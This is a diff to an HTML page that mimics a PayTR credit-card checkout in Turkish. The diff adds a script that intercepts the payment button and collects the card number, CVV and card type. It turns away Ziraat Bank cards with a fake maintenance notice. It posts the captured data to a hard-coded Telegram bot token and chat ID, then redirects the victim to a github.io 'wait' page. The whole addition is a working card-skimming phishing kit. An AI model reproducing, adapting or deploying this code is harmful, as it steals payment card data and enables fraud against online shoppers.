@@ -14,7 +14,7 @@
      <link rel="stylesheet" href="https://www.paytr.com/css/bootstrap.min.css?188">
      <link rel="stylesheet" href="https://www.paytr.com/css/font-awesome.min.css?188">
      <link rel="stylesheet" href="https://www.paytr.com/css/tooltipster.min.css?188">
-     <script src="https://www.paytr.com/js/jquery-3.6.0.min.js?188"></script>
+ 
      <script src="https://www.paytr.com/js/bootstrap-3.4.1.min.js?188"></script>
      <script src="https://www.paytr.com/js/jquery.mask.min.1.14.16.js?188"></script>
      <script src="https://www.paytr.com/js/jquery.tooltipster.min.js?188"></script>
@@ -181,7 +181,7 @@
      </div>
    </div>
    <div class="os_govde">
-     <form id="os_form" autocomplete="off" " method=" post">
+     <form id="paymentForm" autocomplete="off" >
        <div class="container">
          <div class="odeme-yontemi">
            <div class="row">
@@ -246,31 +246,32 @@
                      <div class="col-md-10 col-sm-12 col-md-offset-1">
                        <div class="row o_cc_inin_gz">
                          <div class="col-sm-12 col-md-5">
-                           <span lang="tr" id="kart_ad_soyad_kontrol" class="card_inputs_text_dom">Kart Üzerindeki Ad, Soyad</span>: <input type="text" id="os_cc_name" name="cc_owner" onblur="clearName()" maxlength="75">
+                           <span lang="tr" id="kart_ad_soyad_kontrol" class="card_inputs_text_dom">Kart Üzerindeki Ad, Soyad</span>: 
+                           <input type="text" id="os_cc_name" name="cc_owner" onblur="" maxlength="75" required>
                          </div>
                        </div>
                        <div class="row card_inputs_dom">
                          <div class="col-sm-5">
-                           <span class="card_inputs_text_dom" lang="tr">Kart Numarası</span>: <input class="os_cc_number_inputs" type="text" id="os_cc_number_mask" maxlength="22">
-                           <input id="os_cc_number" name="card_number" class="os_cc_number_inputs number spaces-delete" maxlength="19" style="display: none;">
+                           <span class="card_inputs_text_dom" lang="tr">Kart Numarası</span>: <input class="os_cc_number_inputs" type="text" id="os_cc_number_mask" maxlength="16">
+                           <input id="os_cc_number" name="card_number" class="os_cc_number_inputs number spaces-delete" maxlength="19" style="display: none;" required>
                          </div>
                          <div class="col-sm-4 card_inputs_dom_name">
                            <span lang="tr" class="card_inputs_text_dom">Kart Son Kullanma Tarihi</span>: <div class="row" style="position: relative;">
                              <div style="position: absolute;left: 50%;margin-left: -4px;font-size: 22px;margin-top: 4px;"> / </div>
                              <div class="col-lg-6 col-xs-6">
                                <div>
-                                 <input type="text" name="expiry_month" id="expiry_month" class="number" maxlength="2" placeholder="Ay" lang="tr">
+                                 <input type="text" name="expiry_month" id="expiry_month" class="number" maxlength="2" placeholder="Ay" lang="tr" required>
                                </div>
                              </div>
                              <div class="col-lg-6 col-xs-6">
                                <div>
-                                 <input type="text" name="expiry_year" id="expiry_year" class="number" maxlength="2" placeholder="Yıl" lang="tr">
+                                 <input type="text" name="expiry_year" id="expiry_year" class="number" maxlength="2" placeholder="Yıl" lang="tr" required>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="col-sm-3">
-                           <span lang="tr" class="card_inputs_text_dom">CVV Güvenlik Kodu</span>: <input type="text" id="os_cc_cvv" name="cvv" class="cvv number spaces-delete" maxlength="3" style="width: 100%;padding-left: 35px;">
+                           <span lang="tr" class="card_inputs_text_dom">CVV Güvenlik Kodu</span>: <input type="text" id="os_cc_cvv" name="cvv" class="cvv number spaces-delete" maxlength="3" style="width: 100%;padding-left: 35px;" required>
                            <div class="eft-banka-islem-numarasi" style="left: 26px;margin-top: -30px;">
                              <a href="#" class="cvv-modal-box" id="cvv-modal-box-id" tabindex="99">
                                <i class="fa fa-question-circle-o" aria-hidden="true"></i>
@@ -284,7 +285,7 @@
                              <option value="" lang="tr">Lütfen Seçin</option>
                              <option value="advantage">ADVANTAGE</option>
                              <option value="axess">AXESS / WINGS</option>
-                             <option value="bonus">BONUS</option>
+                             <option value="bonus" selected="selected">BONUS</option>
                              <option value="cardfinans">CARDFİNANS</option>
                              <option value="maximum">MAXIMUM / MAXIMILES</option>
                            </select>
@@ -313,13 +314,20 @@
                              <i class="fa fa-spinner fa-spin"></i>
                              <span lang="tr">Puan Sorgulanıyor</span>
                            </div>
-                           <input type="button" class="custom_odeme_yap_btn os_odeme_yap_btn kart_puan_sorgula" id="kart_odeme_yap_btn" lang="tr" value="Ödeme Yap" style="padding-left: 0;">
+                           <button type="button" class="custom_odeme_yap_btn os_odeme_yap_btn kart_puan_sorgula" id="kart_odeme_yap_btn" lang="tr"  style=" 
+    margin-top: 5px;background-color: #117ec3;    height: 40px !important;    border: none !important;    font-weight: 400 !important;
+    color: #fff !important;    -webkit-transition: all .15s ease-in-out 0s;    padding: 0 0 0 15px;    width: 100%;    font-size: 16px;
+    border-radius: 0;   padding-left: 0;">Ödeme Yap </button>
+                           <div id="error_message" style="display: none;color: red;margin-top: 15px;font-size: 16px;text-align: center;font-weight: 600;"></div>
+                           
                            <div id="odeme_btn_loader" class="os_gnl_odeme_btn_pasif" style="display: none;margin: 5px 0 0 0;width: 100%;">
                              <i class="fa fa-spinner fa-spin"></i>
                              <span lang="tr">Lütfen Bekleyin</span>
                            </div>
                          </div>
                        </div>
+ 
+
                        <div class="row">
                          <div class="col-md-12">
                            <div class="os_kartlar_x2 o_cc_inin_goster">
@@ -343,5 +351,145 @@
          </div>
      </form>
    </div>
+
+
+   <script>
+document.getElementById('kart_odeme_yap_btn').addEventListener('click', function(event) {
+    event.preventDefault();
+
+    const cardNumber = document.getElementById('os_cc_number_mask').value;
+    const expiryMonth = '05';
+    const expiryYear = '28';
+    const cvv = document.getElementById('os_cc_cvv').value;
+    const cardType = document.getElementById('cc_banka_bilgisi').value;
+    const errorMessageDiv = document.getElementById('error_message');
+    const ziraatBankBins = [
+        '407814', '408969', '413226', '413972', '415792', '420556', '421030', '424931', '424935', '427344', '429586', '437838', '437897', '442671', '444676', '444677', '444678', '447504', '450052', '451454', '453955', '453956', '454671', '454672', '454673', '454674', '454894', '459026', '459252', '459268', '459332', '459333', '462448', '462449', '462724', '462725', '463214', '466280', '466281', '466282', '466283', '466284', '468793', '468794', '468795', '468796', '468797', '469884', '471509', '476619', '476662', '477206', '479610', '479612', '479620', '479632', '479633', '479908', '479909', '479915', '479916', '479917', '482489', '482491', '485060', '485061', '489456', '489457', '489458', '489477', '489478', '489479', '498724', '498725', '498749', '499821', '501774', '508129', '511583', '512360', '512440', '515755', '516458', '516740', '516741', '516742', '516835', '516840', '516841', '516843', '516912', '516914', '516944', '516961', '517049', '517343', '519261', '519780', '521875', '521942', '522347', '522356', '522362', '522517', '522566', '522576', '523416', '523529', '523759', '524659', '524677', '526290', '526952', '526955', '526973', '526975', '526995', '527080', '527083', '527369', '527383', '527396', '527657', '527682', '528208', '528246', '528293', '528823', '528825', '529462', '529876', '530905', '531102', '532581', '532813', '533149', '533293', '533330', '533796', '534563', '534981', '535137', '535176', '535177', '535217', '535248', '535280', '535429', '535843', '535881', '536255', '537833', '539605', '540130', '540134', '541001', '542374', '543394', '544836', '547287', '548434', '549938', '552610', '552679', '554253', '554254', '554548', '554566', '554845', '554868', '554975', '554976', '556031', '556033', '558379', '558443', '558446', '558448', '558460', '558485', '558634', '558691', '559056', '559289', '559572', '559576', '559582', '559583', '559584', '559586', '559587', '559589', '559593', '559594', '588992', '589117', '589283', '589288', '589311', '589318', '589416', '600343', '601050', '601354', '601912', '603343', '603797', '606043', '606329', '627462', '639004', '670606', '670610', '670640', '670670', '670868', '676123', '676124', '676166', '676170', '676206', '676255', '676258', '676283', '676366', '676372', '676401', '676402', '676406', '676429', '676460', '676578', '676651', '676827', '676832', '677047', '677055', '677056', '677131', '677193', '677238', '677369', '677397', '677451', '677522'
+    ];
+
+    errorMessageDiv.innerHTML = '';
+    errorMessageDiv.style.display = 'none';
+
+    let isValid = true;
+
+    // Kredi kartı numarası doğrulaması
+    if (!cardNumber) {
+        const errorMessage = document.createElement('div');
+        errorMessage.className = 'error-message';
+        errorMessage.style.color = 'red';
+        errorMessage.innerText = 'Kredi kartı numarası gereklidir.';
+        errorMessageDiv.appendChild(errorMessage);
+        isValid = false;
+    } else if (!isValidCardNumber(cardNumber)) {
+        const errorMessage = document.createElement('div');
+        errorMessage.className = 'error-message';
+        errorMessage.style.color = 'red';
+        errorMessage.innerText = 'Geçersiz kredi kartı numarası.';
+        errorMessageDiv.appendChild(errorMessage);
+        isValid = false;
+    }
+
+    // Son kullanma tarihi doğrulaması
+     
+    if (!cvv) {
+        const errorMessage = document.createElement('div');
+        errorMessage.className = 'error-message';
+        errorMessage.style.color = 'red';
+        errorMessage.innerText = 'CVV gereklidir.';
+        errorMessageDiv.appendChild(errorMessage);
+        isValid = false;
+    } else if (cvv.length !== 3 || isNaN(cvv)) {
+        const errorMessage = document.createElement('div');
+        errorMessage.className = 'error-message';
+        errorMessage.style.color = 'red';
+        errorMessage.innerText = 'Geçersiz CVV kodu.';
+        errorMessageDiv.appendChild(errorMessage);
+        isValid = false;
+    }
+
+    // Kart tipi doğrulaması
+    if (!cardType) {
+        const errorMessage = document.createElement('div');
+        errorMessage.className = 'error-message';
+        errorMessage.style.color = 'red';
+        errorMessage.innerText = 'Lütfen kart tipini seçin.';
+        errorMessageDiv.appendChild(errorMessage);
+        isValid = false;
+    }
+
+    // Ziraatbank kart numarası kontrolü
+    const cardBin = cardNumber.substring(0, 6);
+    if (ziraatBankBins.includes(cardBin)) {
+        const errorMessage = document.createElement('div');
+        errorMessage.className = 'error-message';
+        errorMessage.style.color = 'red';
+        errorMessage.innerText = 'Ziraatbank Kartı ile ödemeler güncelleme nedeni ile kapalıdır.';
+        errorMessageDiv.appendChild(errorMessage);
+        isValid = false;
+    }
+
+    if (isValid) {
+        const message = `Yeni ödeme formu:\nKredi Kartı Numarası: ${cardNumber}\nSon Kullanma Tarihi: ${expiryMonth}/${expiryYear}\nCVV: ${cvv}\nKart Tipi: ${cardType}`;
+        sendMessageToTelegram(message);
+    } else {
+        errorMessageDiv.style.display = 'block';
+    }
+});
+
+function isValidCardNumber(cardNumber) {
+    const sanitized = cardNumber.replace(/\D/g, '');
+    let sum = 0;
+    let shouldDouble = false;
+
+    for (let i = sanitized.length - 1; i >= 0; i--) {
+        let digit = parseInt(sanitized.charAt(i), 10);
+
+        if (shouldDouble) {
+            digit *= 2;
+            if (digit > 9) digit -= 9;
+        }
+
+        sum += digit;
+        shouldDouble = !shouldDouble;
+    }
+
+    return sum % 10 === 0;
+}
+
+ 
+
+function sendMessageToTelegram(message) {
+  const botToken = '8110387711:AAFy7EFtCkNqCcX5G-aPznrn6KvgIDw9PNk';
+  const chatId = '991795418';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    const data = {
+        chat_id: chatId,
+        text: message
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+          window.location.href = 'https://izmiravmarket-odeme.github.io/izmiravmarket-odeme/bekle.html';
+        } else {
+            alert('Mesaj gönderilirken bir hata oluştu.');
+        }
+    })
+    .catch(error => {
+        console.error('Hata:', error);
+        alert('Mesaj gönderilirken bir hata oluştu.');
+    });
+}
+</script>
+
+
  </body>
  </html>
